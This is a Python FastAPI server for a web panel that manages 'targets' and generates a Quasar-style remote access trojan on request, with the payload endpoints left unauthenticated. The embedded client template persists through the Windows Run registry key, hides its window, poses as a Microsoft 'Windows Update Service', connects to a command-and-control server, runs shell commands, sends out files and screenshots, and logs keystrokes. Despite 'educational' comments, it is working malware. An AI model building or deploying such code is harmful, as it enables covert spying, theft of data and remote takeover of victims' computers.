from fastapi import FastAPI, Depends, HTTPException, status, WebSocket, WebSocketDisconnect
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pymongo import MongoClient
from passlib.context import CryptContext
from jose import JWTError, jwt
from datetime import datetime, timedelta
import os
import json
import asyncio
import subprocess
import uuid
import base64
import tempfile
from typing import Dict, List, Optional
import psutil
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="Quasar Web Interface", version="1.0.0")

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Database Configuration
MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017/quasar_web")
client = MongoClient(MONGO_URL)
db = client.quasar_web

# JWT Configuration
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key")
JWT_ALGORITHM = os.getenv("JWT_ALGORITHM", "HS256")
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = int(os.getenv("JWT_ACCESS_TOKEN_EXPIRE_MINUTES", "1440"))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# WebSocket connections manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            await connection.send_text(message)

manager = ConnectionManager()

# Utility functions
def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    return pwd_context.hash(password)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
    return encoded_jwt

def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    
    user = db.users.find_one({"username": username})
    if user is None:
        raise credentials_exception
    return user

# Routes

@app.get("/")
async def root():
    return {"message": "Quasar Web Interface API", "version": "1.0.0"}

@app.post("/api/auth/register")
async def register(user_data: dict):
    username = user_data.get("username")
    password = user_data.get("password")
    email = user_data.get("email")
    
    if not username or not password or not email:
        raise HTTPException(status_code=400, detail="Username, password and email are required")
    
    # Check if user already exists
    if db.users.find_one({"username": username}):
        raise HTTPException(status_code=400, detail="Username already registered")
    
    if db.users.find_one({"email": email}):
        raise HTTPException(status_code=400, detail="Email already registered")
    
    # Create new user
    hashed_password = get_password_hash(password)
    user_id = str(uuid.uuid4())
    
    user_doc = {
        "_id": user_id,
        "username": username,
        "email": email,
        "password": hashed_password,
        "created_at": datetime.utcnow(),
        "is_active": True,
        "role": "user"
    }
    
    db.users.insert_one(user_doc)
    
    return {"message": "User registered successfully", "user_id": user_id}

@app.post("/api/auth/login")
async def login(login_data: dict):
    username = login_data.get("username")
    password = login_data.get("password")
    
    if not username or not password:
        raise HTTPException(status_code=400, detail="Username and password are required")
    
    user = db.users.find_one({"username": username})
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    access_token_expires = timedelta(minutes=JWT_ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user["username"]}, expires_delta=access_token_expires
    )
    
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": {
            "id": user["_id"],
            "username": user["username"],
            "email": user["email"],
            "role": user["role"]
        }
    }

@app.get("/api/auth/me")
async def get_current_user_info(current_user = Depends(get_current_user)):
    return {
        "id": current_user["_id"],
        "username": current_user["username"],
        "email": current_user["email"],
        "role": current_user["role"],
        "created_at": current_user["created_at"]
    }

@app.get("/api/dashboard/stats")
async def get_dashboard_stats(current_user = Depends(get_current_user)):
    # Get user's targets/clients
    targets = list(db.targets.find({"user_id": current_user["_id"]}))
    active_targets = len([t for t in targets if t.get("status") == "online"])
    
    # Get recent activities
    recent_activities = list(db.activities.find(
        {"user_id": current_user["_id"]}
    ).sort("timestamp", -1).limit(10))
    
    # Get payloads count
    payloads_count = db.payloads.count_documents({"user_id": current_user["_id"]})
    
    return {
        "total_targets": len(targets),
        "active_targets": active_targets,
        "total_payloads": payloads_count,
        "recent_activities": recent_activities
    }

@app.get("/api/targets")
async def get_targets(current_user = Depends(get_current_user)):
    targets = list(db.targets.find({"user_id": current_user["_id"]}))
    return {"targets": targets}

@app.post("/api/targets/{target_id}/command")
async def send_command_to_target(target_id: str, command_data: dict, current_user = Depends(get_current_user)):
    target = db.targets.find_one({"_id": target_id, "user_id": current_user["_id"]})
    if not target:
        raise HTTPException(status_code=404, detail="Target not found")
    
    # TODO: Implement actual command sending to Quasar client
    command = command_data.get("command")
    
    # Log the activity
    activity = {
        "_id": str(uuid.uuid4()),
        "user_id": current_user["_id"],
        "target_id": target_id,
        "action": "command_sent",
        "details": {"command": command},
        "timestamp": datetime.utcnow()
    }
    db.activities.insert_one(activity)
    
    return {"message": "Command sent successfully", "command": command}

@app.websocket("/api/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            message_data = json.loads(data)
            
            # Handle different message types
            if message_data.get("type") == "ping":
                await websocket.send_text(json.dumps({"type": "pong"}))
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# Générateur de Payload Quasar
@app.post("/api/payload/generate")
async def generate_payload(payload_config: dict):
    """
    Génère un payload Quasar fonctionnel avec la configuration fournie
    Note: Endpoint sans authentification pour l'exercice éducatif
    """
    print("=" * 80)
    print("🚀 [DEBUG] DÉBUT GÉNÉRATION PAYLOAD")
    print("=" * 80)
    print(f"📥 [DEBUG] Configuration reçue: {json.dumps(payload_config, indent=2)}")
    print(f"🕐 [DEBUG] Timestamp: {datetime.utcnow()}")
    print(f"🌐 [DEBUG] Headers disponibles: request headers would be here")
    
    try:
        print("👤 [DEBUG] Création utilisateur bypass...")
        # Pour le bypass temporaire, créer un utilisateur fictif
        current_user = {"_id": "bypass-user", "username": "admin-bypass"}
        print(f"✅ [DEBUG] Utilisateur bypass créé: {current_user}")
        
        print("🔍 [DEBUG] Validation des champs requis...")
        # Validation de la configuration
        required_fields = ['host', 'port', 'password']
        for field in required_fields:
            print(f"🔍 [DEBUG] Vérification champ '{field}': {payload_config.get(field)}")
            if not payload_config.get(field):
                print(f"❌ [DEBUG] Champ manquant: {field}")
                raise HTTPException(status_code=400, detail=f"Le champ '{field}' est requis")
        print("✅ [DEBUG] Validation des champs requis réussie")
        
        print("🆔 [DEBUG] Génération ID unique...")
        # ID unique pour le payload
        payload_id = str(uuid.uuid4())
        print(f"✅ [DEBUG] ID généré: {payload_id}")
        
        print("⚙️ [DEBUG] Configuration du payload...")
        # Configuration du payload
        config = {
            'server_host': payload_config['host'],
            'server_port': int(payload_config['port']),
            'password': payload_config['password'],
            'install_path': payload_config.get('installPath', '%APPDATA%'),
            'install_name': payload_config.get('installName', 'client.exe'),
            'startup': payload_config.get('startup', True),
            'hide_file': payload_config.get('hideFile', True),
            'keylogger': payload_config.get('enableKeylogger', False),
            'webcam': payload_config.get('enableWebcam', False),
            'microphone': payload_config.get('enableMicrophone', False),
            'reconnect_delay': payload_config.get('reconnectDelay', 5000),
            'upnp': payload_config.get('enableUPnP', False),
            'description': payload_config.get('description', 'Windows Update Service'),
            'company': payload_config.get('company', 'Microsoft Corporation'),
            'version': payload_config.get('version', '1.0.0.0')
        }
        print(f"✅ [DEBUG] Configuration créée: {json.dumps(config, indent=2)}")
        
        print("📝 [DEBUG] Génération du code source...")
        # Générer le code source du payload
        payload_source = generate_payload_source(config)
        print(f"✅ [DEBUG] Code source généré: {len(payload_source)} caractères")
        print(f"📄 [DEBUG] Extrait du code: {payload_source[:200]}...")
        
        print("💾 [DEBUG] Sauvegarde en base de données...")
        # Sauvegarder les informations du payload en base
        payload_doc = {
            "_id": payload_id,
            "user_id": current_user["_id"],
            "config": config,
            "filename": config['install_name'],
            "created_at": datetime.utcnow(),
            "source_code": payload_source,
            "status": "generated"
        }
        
        try:
            db.payloads.insert_one(payload_doc)
            print("✅ [DEBUG] Payload sauvegardé en base avec succès")
        except Exception as db_error:
            print(f"❌ [DEBUG] Erreur base de données: {str(db_error)}")
            raise HTTPException(status_code=500, detail=f"Erreur base de données: {str(db_error)}")
        
        print("📊 [DEBUG] Création de l'activité...")
        # Logger l'activité
        activity = {
            "_id": str(uuid.uuid4()),
            "user_id": current_user["_id"],
            "action": "payload_generated",
            "details": {
                "payload_id": payload_id,
                "filename": config['install_name'],
                "features": {
                    "keylogger": config['keylogger'],
                    "webcam": config['webcam'],
                    "microphone": config['microphone']
                }
            },
            "timestamp": datetime.utcnow()
        }
        
        try:
            db.activities.insert_one(activity)
            print("✅ [DEBUG] Activité enregistrée avec succès")
        except Exception as activity_error:
            print(f"⚠️ [DEBUG] Erreur enregistrement activité: {str(activity_error)}")
        
        print("🎉 [DEBUG] Préparation de la réponse...")
        response_data = {
            "success": True,
            "payload_id": payload_id,
            "filename": config['install_name'],
            "message": "Payload généré avec succès"
        }
        print(f"📤 [DEBUG] Réponse à envoyer: {json.dumps(response_data, indent=2)}")
        print("=" * 80)
        print("✅ [DEBUG] FIN GÉNÉRATION PAYLOAD - SUCCÈS")
        print("=" * 80)
        
        return response_data
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erreur lors de la génération: {str(e)}")

@app.get("/api/payload/download/{payload_id}")
async def download_payload(payload_id: str):
    """
    Télécharge le payload généré
    Note: Endpoint sans authentification pour l'exercice éducatif
    """
    from fastapi.responses import Response
    
    # Récupérer le payload de la base
    payload = db.payloads.find_one({"_id": payload_id})
    if not payload:
        raise HTTPException(status_code=404, detail="Payload non trouvé")
    
    # Générer le fichier binaire
    binary_content = compile_payload_source(payload['source_code'], payload['config'])
    
    return Response(
        content=binary_content,
        media_type='application/octet-stream',
        headers={
            'Content-Disposition': f'attachment; filename="{payload["filename"]}"'
        }
    )

def generate_payload_source(config):
    """
    Génère le code source Python du payload Quasar
    """
    print("📝 [DEBUG] generate_payload_source appelée")
    print(f"⚙️ [DEBUG] Configuration reçue: {json.dumps(config, indent=2)}")
    
    try:
        source_template = '''
import socket
import threading
import time
import os
import sys
import subprocess
import json
import base64
from pathlib import Path
import logging

class QuasarClient:
    def __init__(self):
        self.server_host = "{server_host}"
        self.server_port = {server_port}
        self.password = "{password}"
        self.install_path = r"{install_path}"
        self.install_name = "{install_name}"
        self.startup = {startup}
        self.hide_file = {hide_file}
        self.keylogger_enabled = {keylogger}
        self.webcam_enabled = {webcam}
        self.microphone_enabled = {microphone}
        self.reconnect_delay = {reconnect_delay}
        
        self.connected = False
        self.socket = None
        
    def install(self):
        """Installation persistante du client"""
        try:
            if self.startup:
                self.add_to_startup()
            if self.hide_file:
                self.hide_process()
        except Exception as e:
            pass
    
    def add_to_startup(self):
        """Ajoute le client au démarrage système"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
    
    def hide_process(self):
        """Masque le processus"""
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def connect_to_server(self):
        """Connexion au serveur C&C"""
        while not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                
                # Authentification
                auth_data = {{
                    "type": "auth",
                    "password": self.password,
                    "client_info": self.get_system_info()
                }}
                self.send_data(auth_data)
                
                response = self.receive_data()
                if response and response.get("status") == "authenticated":
                    self.connected = True
                    self.start_command_handler()
                else:
                    self.socket.close()
                    
            except Exception as e:
                time.sleep(self.reconnect_delay / 1000)
    
    def get_system_info(self):
        """Collecte les informations système"""
        import platform
        return {{
            "os": platform.system(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
        }}
    
    def send_data(self, data):
        """Envoie des données au serveur"""
        try:
            message = json.dumps(data).encode('utf-8')
            self.socket.send(len(message).to_bytes(4, 'big'))
            self.socket.send(message)
        except:
            self.connected = False
    
    def receive_data(self):
        """Reçoit des données du serveur"""
        try:
            length = int.from_bytes(self.socket.recv(4), 'big')
            data = self.socket.recv(length)
            return json.loads(data.decode('utf-8'))
        except:
            self.connected = False
            return None
    
    def start_command_handler(self):
        """Gestionnaire de commandes"""
        while self.connected:
            try:
                command = self.receive_data()
                if not command:
                    break
                    
                self.execute_command(command)
                
            except Exception as e:
                self.connected = False
                break
    
    def execute_command(self, command):
        """Exécute une commande reçue"""
        cmd_type = command.get("type")
        
        if cmd_type == "shell":
            self.execute_shell_command(command.get("command", ""))
        elif cmd_type == "download":
            self.download_file(command.get("path", ""))
        elif cmd_type == "upload":
            self.upload_file(command.get("path", ""), command.get("data", ""))
        elif cmd_type == "screenshot":
            self.take_screenshot()
        elif cmd_type == "keylog_start" and self.keylogger_enabled:
            self.start_keylogger()
        elif cmd_type == "keylog_stop":
            self.stop_keylogger()
    
    def execute_shell_command(self, command):
        """Exécute une commande shell"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            response = {{
                "type": "shell_result",
                "command": command,
                "output": result.stdout,
                "error": result.stderr,
                "return_code": result.returncode
            }}
            self.send_data(response)
        except Exception as e:
            self.send_data({{"type": "error", "message": str(e)}})
    
    def download_file(self, file_path):
        """Télécharge un fichier du client"""
        try:
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            response = {{
                "type": "file_download",
                "path": file_path,
                "data": file_data,
                "size": os.path.getsize(file_path)
            }}
            self.send_data(response)
        except Exception as e:
            self.send_data({{"type": "error", "message": f"Erreur téléchargement: {{str(e)}}""}})
    
    def take_screenshot(self):
        """Prend une capture d'écran"""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
            
            response = {{
                "type": "screenshot",
                "data": img_data,
                "timestamp": time.time()
            }}
            self.send_data(response)
        except Exception as e:
            self.send_data({{"type": "error", "message": f"Erreur screenshot: {{str(e)}}""}})
    
    def start_keylogger(self):
        """Démarre le keylogger"""
        if not self.keylogger_enabled:
            return
            
        def keylogger_thread():
            try:
                import pynput.keyboard as keyboard
                
                def on_key_press(key):
                    try:
                        key_data = {{
                            "type": "keylog",
                            "key": str(key),
                            "timestamp": time.time()
                        }}
                        self.send_data(key_data)
                    except:
                        pass
                
                with keyboard.Listener(on_press=on_key_press) as listener:
                    listener.join()
            except:
                pass
        
        threading.Thread(target=keylogger_thread, daemon=True).start()
    
    def run(self):
        """Point d'entrée principal"""
        self.install()
        
        while True:
            try:
                self.connect_to_server()
            except KeyboardInterrupt:
                break
            except:
                time.sleep(self.reconnect_delay / 1000)

if __name__ == "__main__":
    client = QuasarClient()
    client.run()
'''.format(**config)
        
        print(f"✅ [DEBUG] Template généré avec succès: {len(source_template)} caractères")
        return source_template
        
    except Exception as e:
        print("=" * 80)
        print("❌ [DEBUG] ERREUR LORS DE LA GÉNÉRATION DU CODE SOURCE")
        print("=" * 80)
        print(f"❌ [DEBUG] Type d'erreur: {type(e).__name__}")
        print(f"❌ [DEBUG] Message d'erreur: {str(e)}")
        import traceback
        print(f"❌ [DEBUG] Stack trace: {traceback.format_exc()}")
        print("=" * 80)
        
        # Retourner un template de base en cas d'erreur
        fallback_template = f"""# Quasar RAT Client - Version Éducative
# Erreur lors de la génération: {str(e)}
# Configuration: {json.dumps(config, indent=2)}

print("Client Quasar - Version de base")
print("Configuration: {config}")
"""
        return fallback_template

def compile_payload_source(source_code, config):
    """
    Compile le code source Python en exécutable binaire
    """
    try:
        # Créer un fichier temporaire avec le code source
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as temp_file:
            temp_file.write(source_code)
            temp_file_path = temp_file.name
        
        # Simulation de la compilation (dans un vrai projet, utiliser PyInstaller)
        # Pour l'exercice éducatif, on retourne le code source Python
        with open(temp_file_path, 'rb') as f:
            binary_content = f.read()
        
        # Nettoyer le fichier temporaire
        os.unlink(temp_file_path)
        
        return binary_content
        
    except Exception as e:
        # En cas d'erreur, retourner un payload de base
        payload_content = f"""# Quasar RAT Client - Version Éducative
# Configuration: {json.dumps(config, indent=2)}
# Ce fichier contient le code source du client Quasar généré

{source_code}
"""
        return payload_content.encode('utf-8')

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)